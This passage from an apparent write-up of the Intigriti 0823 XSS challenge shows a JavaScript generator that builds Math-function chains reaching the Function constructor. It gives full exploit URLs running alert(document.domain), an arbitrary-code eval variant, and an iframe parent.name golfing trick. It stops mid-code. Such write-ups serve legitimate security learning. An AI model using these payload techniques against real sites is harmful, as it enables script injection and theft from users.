class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// if we can't, we use integer to make a string</span>    <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    currentIndex<span class="token operator">++</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token comment">// generate space then trim</span>  <span class="token keyword">let</span> spaceResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  spaceResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> spaceResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.prototype.trim.call'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>  <span class="token comment">//return codeResult</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'alert(document.domain)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The final result is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>round<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>hypot<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>tan<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>acosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>expm1<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>trim<span class="token punctuation">.</span>call<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>join<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>call<span class="token punctuation">.</span>call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exploit URL: <a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call</a></p><h2><span id="arbitrary-xss">Arbitrary XSS</span></h2><p>The above code merely executes the static <code>alert(document.domain)</code> command. Is it possible to execute arbitrary JavaScript code?</p><p>As long as a short enough payload can be found, it seems feasible.</p><p>For instance, <code>eval(location.hash.slice(1))</code> is relatively short, but still a bit long. If you use the script I provided above, it might hang for a while due to some bugs in my code. Ultimately, it generates a result of length 120, which exceeds the 100-character limit.</p><p>However, another payload like <code>eval(&quot;&#39;&quot;+location)</code> works fine and has a length of 85.</p><p><a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;)</a></p><p>Once the ability to execute arbitrary code is achieved, the next step is to strive to identify the shortest possible set of operations.</p><h2><span id="code-golf-time">Code golf time</span></h2><h3><span id="shortest-xss-payload">Shortest XSS payload</span></h3><p>While the previous payload <code>eval(&quot;&#39;&quot;+location)</code> is already quite short, for this challenge, there is an even shorter payload.</p><p>I learned from @DrBrix that you can use <code>eval(parent.name)</code> to shorten the length further, and this clever technique leverages iframes.</p><p>In the challenge page, a special name was set up to ensure it doesn’t get overwritten, but we can utilize it’s parent page. The page <code>https://challenge-0823.intigriti.io/</code> embeds <code>chanllenge/index.html</code> using an iframe, so using <code>parnent.name</code> allows us to access the name of <code>https://challenge-0823.intigriti.io/</code>.</p><p>Thus, @DrBrix’s strategy is as follows: First, create a page named exp.html, add an iframe with the name set to the payload, and replace the location with <code>https://challenge-0823.intigriti.io</code>. </p><p>The structure becomes:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Then you can use <code>frames[0].frames[0]</code> to access the innermost iframe and redirect it to the prepared URL, resulting in:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, you can use <code>parent.name</code> to access the adjusted name. The code looks like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&lt;script>name = "alert(document.domain)"document.location = "https://challenge-0823.intigriti.io/"&lt;/script><span class="token punctuation">'</span></span><span class="token 